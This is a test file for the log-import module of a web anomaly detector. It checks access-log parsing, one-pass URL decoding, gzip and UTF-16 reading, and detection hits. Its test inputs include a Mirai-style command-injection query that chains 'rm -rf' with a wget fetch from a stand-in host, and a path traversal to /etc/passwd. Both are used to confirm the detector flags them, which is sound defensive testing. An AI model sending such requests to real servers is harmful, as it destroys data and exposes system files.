import { test } from 'node:test';
import assert from 'node:assert/strict';
import { readdirSync } from 'node:fs';
import { gzipSync } from 'node:zlib';
import { RuleEngine } from '@anomaly-guard/core';
import { readLog } from '../src/log-import/read.js';
import {
  PATH_PARAM,
  QUERY_PARAM,
  decodeOnce,
  parseQuery,
  splitTarget,
  toRequest,
} from '../src/log-import/request.js';
import {
  MAX_TEXT_CHARS,
  MAX_TEXT_LINES,
  isGzip,
  readFiles,
  readText,
} from '../src/log-import/text.js';

const DIR = new URL('../src/log-import/formats/', import.meta.url);
const FORMATS = [];
for (const file of readdirSync(DIR)
  .filter((f) => f.endsWith('.js'))
  .sort()) {
  FORMATS.push((await import(new URL(file, DIR).href)).default);
}
const line = (path, n = 1) =>
  `192.0.2.${n} - - [01/Nov/2026:10:00:00 +0000] "GET ${path} HTTP/1.1" 200 10 "-" "test"`;

test('readLog: counts what it read, what it skipped and what it could not read', () => {
  const text = [
    line('/a'),
    '',
    'garbage that no format reads',
    '192.0.2.9 - - [01/Nov/2026:10:00:00 +0000] "-" 400 0 "-" "-"',
    line('/b?x=1'),
  ].join('\n');
  const read = readLog(text, FORMATS);
  assert.equal(read.format.id, 'apache');
  assert.equal(read.lines, 4); // empty lines are not counted
  assert.equal(read.entries.length, 2);
  assert.deepEqual(
    read.entries.map((e) => e.line),
    [1, 5],
  );
  assert.equal(read.skipped, 1);
  assert.equal(read.unreadable, 1);
  assert.deepEqual(read.examples, [{ line: 3, text: 'garbage that no format reads' }]);
  assert.equal(read.truncated, false);
});

test('readLog: a format chosen by hand, and the cap on requests', () => {
  const text = Array.from({ length: 30 }, (_, i) => line(`/p${i}`)).join('\n');
  const forced = readLog(text, FORMATS, { formatId: 'request-line' });
  assert.equal(forced.format.id, 'request-line');
  assert.equal(forced.entries.length, 30);
  const capped = readLog(text, FORMATS, { maxRequests: 10 });
  assert.equal(capped.entries.length, 10);
  assert.equal(capped.truncated, true);
});

test('targets: paths kept as logged, absolute URLs, queries decoded once', () => {
  assert.deepEqual(splitTarget('/a/../b?x=1#frag'), { path: '/a/../b', query: 'x=1', host: null });
  assert.deepEqual(splitTarget('https://www.example.com:443/s?q=1'), {
    path: '/s',
    query: 'q=1',
    host: 'www.example.com:443',
  });
  assert.deepEqual(splitTarget('http://www.example.com'), {
    path: '/',
    query: '',
    host: 'www.example.com',
  });
  assert.equal(decodeOnce('a+b%20c'), 'a b c');
  assert.equal(decodeOnce('100%25'), '100%');
  assert.equal(
    decodeOnce('%2527'),
    '%27',
    'one pass only: double encoding stays visible (ADR-006)',
  );
  assert.equal(decodeOnce('bad%E0%A4end %41'), 'bad%E0%A4end A', 'a broken escape is kept');
  assert.equal(decodeOnce('/a+b', { plusIsSpace: false }), '/a+b');
  assert.deepEqual(parseQuery('a=1&b&a=2&=x&c=%3Cs%3E&d+e'), {
    a: '1',
    [QUERY_PARAM]: 'b',
    'a#2': '2',
    '': 'x',
    c: '<s>',
    [`${QUERY_PARAM}#2`]: 'd e',
  });
});

test('a query without a name is a value: the rules and the statistics see it', () => {
  // How real scans send a command (Mirai-style, here with documentation names): no "=", so as a
  // parameter name the payload would reach neither the rules nor the statistics.
  const request = toRequest({
    method: 'GET',
    target: '/shell?cd+/tmp;rm+-rf+*;wget+example.com/x',
  });
  assert.deepEqual(request.params, {
    [QUERY_PARAM]: 'cd /tmp;rm -rf *;wget example.com/x',
    [PATH_PARAM]: '/shell',
  });
  const hits = new RuleEngine().inspect(request).hits;
  assert.ok(hits.some((hit) => hit.kind === 'cmdi' && hit.param === QUERY_PARAM));
});

test('toRequest: the detector sees the parameters and the decoded path', () => {
  const request = toRequest({ method: 'GET', target: '/files/..%2F..%2Fetc%2Fpasswd?name=a+b' });
  assert.equal(request.method, 'GET');
  assert.equal(request.path, '/files/..%2F..%2Fetc%2Fpasswd');
  assert.deepEqual(request.params, { name: 'a b', [PATH_PARAM]: '/files/../../etc/passwd' });
  const clash = toRequest({ method: 'GET', target: `/x?${encodeURIComponent(PATH_PARAM)}=1` });
  assert.deepEqual(Object.keys(clash.params), [PATH_PARAM, `${PATH_PARAM}#2`]);
  assert.equal(toRequest({ method: 'OPTIONS', target: '*' }).path, '*');
});

const gzip = (text) =>
  new Response(new Blob([text]).stream().pipeThrough(new CompressionStream('gzip'))).blob();

test('files: plain and gzip, several in name order', async () => {
  const plain = new Blob([`${line('/plain')}\n`]);
  assert.equal(await isGzip(plain), false);
  assert.deepEqual(await readText(plain), {
    text: `${line('/plain')}\n`,
    cut: false,
    damaged: false,
  });
  const zipped = await gzip(`${line('/zipped')}\n`);
  assert.equal(await isGzip(zipped), true);
  assert.deepEqual(await readText(zipped), {
    text: `${line('/zipped')}\n`,
    cut: false,
    damaged: false,
  });
  const joined = await readFiles([
    new File([line('/second')], 'b.log'),
    new File([line('/first')], 'a.log'),
  ]);
  assert.deepEqual(joined, {
    text: `${line('/first')}\n${line('/second')}\n`,
    cut: [],
    damaged: [],
  });
  assert.equal(MAX_TEXT_CHARS, 100 * 1024 * 1024);
});

test('files: only the start of a large log is kept, cut at the end of a line', async () => {
  assert.deepEqual(await readText(new Blob(['a\nbb\nccc\n']), { maxChars: 5 }), {
    text: 'a\nbb\n',
    cut: true,
    damaged: false,
  });
  assert.deepEqual(await readText(new Blob(['a\nbb\n']), { maxChars: 5 }), {
    text: 'a\nbb\n',
    cut: false,
    damaged: false,
  });
  // a gzip file expands: the budget is on the text, not on the file
  const zipped = await gzip(`${'x'.repeat(5000)}\n`.repeat(200));
  assert.ok(zipped.size < 5000);
  const kept = await readText(zipped, { maxChars: 12000 });
  assert.equal(kept.cut, true);
  assert.equal(kept.text, `${'x'.repeat(5000)}\n`.repeat(2));
  // several files share the budget: once one is cut, the later ones are left out
  const files = [
    new File(['1234\n'], 'a.log'),
    new File(['5678\n9\n'], 'b.log'),
    new File(['0\n'], 'c.log'),
  ];
  assert.deepEqual(await readFiles(files, { maxChars: 8 }), {
    text: '1234\n',
    cut: ['b.log', 'c.log'],
    damaged: [],
  });
  // and the lines: the page analyses 100,000 requests, so it keeps twice as many lines
  assert.equal(MAX_TEXT_LINES, 200_000);
  assert.deepEqual(await readText(new Blob(['a\nb\nc\n']), { maxLines: 2 }), {
    text: 'a\nb\n',
    cut: true,
    damaged: false,
  });
  assert.equal((await readText(new Blob(['a\nb\n']), { maxLines: 2 })).cut, false);
  const lines = [
    new File(['1\n2\n'], 'a.log'),
    new File(['3\n4\n'], 'b.log'),
    new File(['5\n'], 'c.log'),
  ];
  assert.deepEqual(await readFiles(lines, { maxLines: 3 }), {
    text: '1\n2\n3\n',
    cut: ['b.log', 'c.log'],
    damaged: [],
  });
});

test('files: gzip of several members, damaged gzip, UTF-16', async () => {
  // Nginx writes one gzip member per buffer, and `cat a.gz b.gz` joins two: all are read. The
  // first member here is stored, not compressed, and holds the gzip signature in its data: the
  // reader must not take that for the start of the next member.
  const lines = Array.from({ length: 5000 }, (_, i) => `${line(`/p${i}`)}\n`).join('');
  const stored = Buffer.from('one\n\x1f\x8b\x08 two\n', 'latin1');
  const members = new Blob([gzipSync(stored, { level: 0 }), gzipSync(lines), gzipSync('three\n')]);
  const read = await readText(members);
  assert.equal(read.damaged, false);
  assert.equal(read.text, `${new TextDecoder().decode(stored)}${lines}three\n`);
  // A gzip file cut short keeps the whole lines read before the damage, and says so.
  const whole = gzipSync(lines);
  const short = await readText(new Blob([whole.subarray(0, whole.length >> 1)]));
  assert.equal(short.damaged, true);
  assert.ok(short.text.length > 0 && lines.startsWith(short.text) && short.text.endsWith('\n'));
  const files = await readFiles([new File([whole.subarray(0, 4000)], 'short.log.gz')]);
  assert.deepEqual(files.damaged, ['short.log.gz']);
  // Damaged from its first bytes: nothing to keep, an error that names the file.
  await assert.rejects(
    readFiles([new File([new Uint8Array([0x1f, 0x8b, 9, 1, 2, 3])], 'bad.log.gz')]),
    /bad\.log\.gz could not be read/,
  );
  // Windows tools write UTF-16 with a byte order mark.
  const utf16 = (text, littleEndian) => {
    const bytes = new Uint8Array(2 + text.length * 2);
    const view = new DataView(bytes.buffer);
    view.setUint16(0, 0xfeff, littleEndian);
    [...text].forEach((c, i) => view.setUint16(2 + i * 2, c.charCodeAt(0), littleEndian));
    return new Blob([bytes]);
  };
  assert.equal((await readText(utf16('a\nb\n', true))).text, 'a\nb\n');
  assert.equal((await readText(utf16('a\nb\n', false))).text, 'a\nb\n');
});
